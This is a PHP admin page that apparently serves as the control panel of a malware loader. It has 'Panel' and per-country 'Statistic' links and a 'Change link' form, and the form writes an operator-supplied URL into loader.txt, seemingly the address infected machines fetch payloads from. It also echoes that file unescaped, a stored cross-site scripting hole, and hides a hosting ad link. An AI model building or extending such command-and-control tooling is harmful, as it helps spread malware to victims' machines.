<?php
  include('protect.php');
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	
    <title></title>
    <link href="css/style_loader.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

    <script src="js/bootstrap.js"></script>
	<style>[class="cbalink"]{display:none;}</style>
  </head>
    <body style = "background-color: #ffffff">
        <nav class="navbar navbar-inverse">
        
            <div class="container-fluid" style = "background-color: #ffffff">
                <div class="navbar-header">
                </div>
                <ul class="nav navbar-nav">
                <li><a href="Table.php" style="color: black">Panel</a></li>
                    <li><a href="Countries.php" style="color: black">Statistic</a></li>
				<li><a href="logout.php" style="color: black">Logout</a></li>                
                </ul>
            </div>
        </nav>
		
        <div style="width:25%; margin: 0 auto;">
            <div class="well" style="opacity: 0.9; text-align:center;">
            <h4>Change link</h4>
			<?php
					echo file_get_contents("loader.txt");
			?>
                <form method="POST" action="">
				
                    <div class="form-group">
                    	<form method="POST" action="">
						<input name="writing" type="text">
                    </div>					                     				
				<input type="submit" class="btn btn-primary" name="send" value="Change">
                </form>
				
				
            </div>					
         
    </body>
</html>

<?php

    function refresh()
    {
        ?>
        <script>
            document.location.href = "/loader.php";
        </script>
        <?php
    } 
    ?>
<?php
	
	if(isset($_POST['send']))
	{
		
		$f = fopen("loader.txt","w");	
		fwrite($f, $_POST['writing']);	
		fclose($f);
                refresh();
	}

?>